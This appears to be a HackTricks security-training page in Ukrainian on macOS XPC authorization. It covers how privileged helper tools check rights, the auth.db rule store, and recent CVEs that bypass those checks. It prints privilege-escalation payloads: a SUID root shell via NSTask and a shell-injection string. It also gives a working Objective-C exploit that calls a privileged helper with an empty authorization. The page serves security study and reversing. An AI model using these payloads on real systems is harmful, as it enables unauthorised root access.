# macOS XPC Авторизація

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Авторизація

Apple також пропонує інший спосіб аутентифікації, якщо процес, що підключається, має **повноваження для виклику відкритого XPC-методу**.

Коли застосунку потрібно **виконувати дії від імені привілейованого користувача**, замість запуску самого застосунку з привілеями він зазвичай встановлює під root HelperTool як XPC-сервіс, який можна викликати з застосунку для виконання цих дій. Однак застосунок, що викликає сервіс, повинен мати достатню авторизацію.

### ShouldAcceptNewConnection завжди YES

Приклад можна знайти в [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). У `App/AppDelegate.m` він намагається **підключитися** до **HelperTool**. А у `HelperTool/HelperTool.m` функція **`shouldAcceptNewConnection`** **не перевіряє** жодної з вимог, вказаних вище. Вона завжди повертає YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Для отримання додаткової інформації про те, як правильно налаштувати цю перевірку:


{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Права додатку

Однак відбувається певна **авторизація, коли викликається метод з HelperTool**.

Функція **`applicationDidFinishLaunching`** з `App/AppDelegate.m` створить порожнє посилання авторизації після запуску додатку. Це повинно завжди працювати.\
Потім воно спробує **додати деякі права** до цього authorization reference, викликаючи `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Функція `setupAuthorizationRights` з `Common/Common.m` запише в базу авторизації `/var/db/auth.db` права застосунку. Зверніть увагу, що вона додає лише ті права, яких ще немає в базі:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Функція `enumerateRightsUsingBlock` використовується для отримання дозволів застосунків, які визначені в `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Це означає, що в кінці цього процесу дозволи, оголошені всередині `commandInfo`, будуть збережені в `/var/db/auth.db`. Зверніть увагу, що там ви можете знайти для **кожного методу**, який **вимагатимуть автентифікації**, **назву дозволу** і **`kCommandKeyAuthRightDefault`**. Останній **вказує, хто може отримати це право**.

There are different scopes to indicate who can access a right. Some of them are defined in [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (you can find [all of them in here](https://www.dssw.co.uk/reference/authorization-rights/)), but as summary:

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Будь-хто</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ніхто</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Поточний користувач має бути адміністратором (в групі admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Запитати автентифікацію користувача.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Запитати автентифікацію користувача. Він повинен бути адміністратором (в групі admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Задати правила</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Задати додаткові коментарі для права</td></tr></tbody></table>

### Rights Verification

У `HelperTool/HelperTool.m` функція **`readLicenseKeyAuthorization`** перевіряє, чи має викликач право на **виконання такого методу**, викликаючи функцію **`checkAuthorization`**. Ця функція перевіряє, що **authData**, надіслані викликаючим процесом, мають **коректний формат**, а потім перевіряє, **що потрібно, щоб отримати право** викликати конкретний метод. Якщо все гаразд, повернений **`error` буде `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Зауважте, що щоб **перевірити вимоги для отримання права** викликати цей метод, функція `authorizationRightForCommand` просто перевіряє раніше зазначений об'єкт **`commandInfo`**. Потім вона викликає **`AuthorizationCopyRights`** щоб перевірити **чи має вона права** викликати функцію (зауважте, що прапорці дозволяють взаємодію з користувачем).

У цьому випадку, щоб викликати функцію `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` визначено як `@kAuthorizationRuleClassAllow`. Отже **будь-хто може її викликати**.

### Інформація DB

Було зазначено, що ця інформація зберігається в `/var/db/auth.db`. Ви можете перелічити всі збережені правила за допомогою:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Тоді ви можете дізнатися, хто має доступ до цього права:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Пом'якшені права

Ви можете знайти **усі конфігурації дозволів** [**in here**](https://www.dssw.co.uk/reference/authorization-rights/), але комбінації, що не вимагатимуть взаємодії з користувачем, будуть:

1. **'authenticate-user': 'false'**
- Це найпряміший ключ. Якщо встановлено в `false`, він зазначає, що користувач не повинен надавати автентифікацію, щоб отримати це право.
- Використовується в **у поєднанні з одним із двох нижче або вказанням групи**, членом якої повинен бути користувач.
2. **'allow-root': 'true'**
- Якщо користувач працює як root user (який має підвищені привілеї), і цей ключ встановлено в `true`, root user потенційно може отримати це право без додаткової автентифікації. Однак, зазвичай, отримання статусу root вже потребує автентифікації, тож для більшості користувачів це не є сценарієм «без автентифікації».
3. **'session-owner': 'true'**
- Якщо встановлено в `true`, власник сесії (користувач, що наразі увійшов у систему) автоматично отримає це право. Це може обійти додаткову автентифікацію, якщо користувач вже увійшов у систему.
4. **'shared': 'true'**
- Цей ключ не надає права без автентифікації. Натомість, якщо встановлено в `true`, це означає, що після того, як право було автентифіковано, його можна розділити між кількома процесами без потреби кожному повторно автентифіковуватись. Але початкове надання права все одно вимагатиме автентифікації, якщо воно не комбінується з іншими ключами, наприклад `'authenticate-user': 'false'`.

You can [**use this script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) to get the interesting rights:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Приклади обходу авторизації

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Привілейований Mach-сервіс `com.acustica.HelperTool` приймає всі підключення, а його процедура `checkAuthorization:` викликає `AuthorizationCopyRights(NULL, …)`, тому будь-який 32‑byte blob проходить. `executeCommand:authorization:withReply:` потім передає керовані атакуючим рядки, розділені комами, до `NSTask` із правами root, створюючи payloads такі як:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
тривіально створити SUID root shell. Details in [this write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Слухач завжди повертає YES, і в `checkAuthorization:` зустрічається той самий NULL-патерн `AuthorizationCopyRights`. Метод `exchangeAppWithReply:` конкатенує введення від атакуючого в рядок для `system()` двічі, тож інжекція shell-метасимволів у `appPath` (наприклад `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) дає виконання коду від імені root через Mach service `com.plugin-alliance.pa-installationhelper`. More info [here](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).
- **CVE-2024-4395 – Jamf Compliance Editor helper**: Запуск аудиту скидає `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, відкриває Mach service `com.jamf.complianceeditor.helper` і експортує `-executeScriptAt:arguments:then:` без перевірки `AuthorizationExternalForm` викликачa або підпису коду. Тривіальний експлойт викликає `AuthorizationCreate` для отримання пустого референсу, підключається через `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` і викликає метод для виконання довільних бінарників як root. Full reversing notes (plus PoC) in [Mykola Grymalyuk’s write-up](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).
- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 and 7.4.0–7.4.2 приймав спеціально сформовані XPC-повідомлення, які діставалися до привілейованого helper без механізмів авторизації. Оскільки helper довіряв своєму привілейованому `AuthorizationRef`, будь-який локальний користувач, здатний надіслати повідомлення сервісу, міг змусити його виконати довільні зміни конфігурації або команди від імені root. Details in [SentinelOne’s advisory summary](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).

#### Поради для швидкого тріажу

- Коли додаток постачається і з GUI, і з helper, порівняйте їхні code requirements і перевірте, чи `shouldAcceptNewConnection` фіксує listener за допомогою `-setCodeSigningRequirement:` (або валіднує `SecCodeCopySigningInformation`). Відсутність перевірок зазвичай призводить до сценаріїв CWE-863, як у випадку Jamf. Короткий огляд виглядає так:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Порівняйте те, що helper *думає*, що він авторизує, з тим, що передає client. Під час реверсингу зупиняйтесь на `AuthorizationCopyRights` і підтвердіть, що `AuthorizationRef` походить від `AuthorizationCreateFromExternalForm` (наданий клієнтом), а не з привілейованого контексту самого helper — інакше ви, ймовірно, знайшли патерн CWE-863, подібний до наведених вище.

## Реверсинг Authorization

### Перевірка, чи використовується EvenBetterAuthorization

Якщо ви знайдете функцію: **`[HelperTool checkAuthorization:command:]`**, ймовірно процес використовує раніше згадану схему авторизації:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Якщо ця функція викликає такі функції, як `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, то вона використовує [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Перевірте **`/var/db/auth.db`**, щоб з'ясувати, чи можна отримати дозволи на виклик привілейованої дії без взаємодії з користувачем.

### Протокол комунікації

Далі потрібно знайти схему протоколу, щоб встановити зв'язок з XPC service.

Функція **`shouldAcceptNewConnection`** вказує на протокол, який експортується:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

У цьому випадку те саме, що й в EvenBetterAuthorizationSample, [**перевірте цей рядок**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Знаючи назву вжитого протоколу, можливо **dump its header definition** за допомогою:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Нарешті, нам потрібно знати **ім'я відкритого Mach Service**, щоб встановити з ним зв'язок. Існує кілька способів це знайти:

- У **`[HelperTool init]`**, де видно, який Mach Service використовується:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- У launchd plist:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exploit Example

У цьому прикладі створено:

- Визначення протоколу з функціями
- Порожній auth для використання при запиті доступу
- Підключення до XPC-сервісу
- Виклик функції, якщо підключення було успішним
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Інші XPC-помічники підвищення привілеїв, якими зловживали

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Джерела

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)
- [https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [https://www.sentinelone.com/vulnerability-database/cve-2025-25251/](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)

{{#include ../../../../../banners/hacktricks-training.md}}
